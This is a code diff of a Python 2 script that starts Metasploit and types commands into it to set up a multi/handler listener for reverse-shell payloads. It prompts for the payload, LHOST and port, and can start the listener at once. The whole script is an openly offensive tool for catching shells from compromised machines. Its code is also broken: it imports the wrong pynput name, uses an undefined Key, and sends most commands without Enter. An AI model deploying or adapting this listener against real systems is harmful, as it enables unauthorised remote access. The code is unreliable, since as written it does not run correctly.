@@ -1,4 +1,7 @@
 import os, time
+from pynput import Keyboard, Controller
+
+keyboard = Controller()
 
 os.system("clear")
 payload = raw_input("What payload are you going to be using? ")
@@ -11,16 +14,30 @@ exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
 exploitTwo = exploit.lower()
 
 os.system("msfconsole")
-print("Script Waiting 10 seconds to allow the Metasploit Console to load fully.")
 time.sleep(10)
-os.system("use exploit/multi/handler")
-os.system("set payload " + payload)
-os.system("set LHOST " + ip)
-os.system("set lport " + port)
+keyboard.type("use exploit/multi/handler")
+keyboard.type("set payload " + payload)
+keyboard.type("set LHOST " + ip)
+keyboard.type("set lport " + port)
 if exploitTwo == "y":
-    os.system("exploit -j -z")
+    keyboard.type("exploit -j -z")
+    keyboard.press(Key.enter)
 elif exploitTwo == "n":
     pass
-
 else:
-    print("That is not an allowed response.")
+    print("That is not a valid response.")
+
+
+# os.system("msfconsole")
+# time.sleep(10)
+# os.system("use exploit/multi/handler")
+# os.system("set payload " + payload)
+# os.system("set LHOST " + ip)
+# os.system("set lport " + port)
+# if exploitTwo == "y":
+#     os.system("exploit -j -z")
+# elif exploitTwo == "n":
+#     pass
+
+# else:
+#     print("That is not an allowed response.")
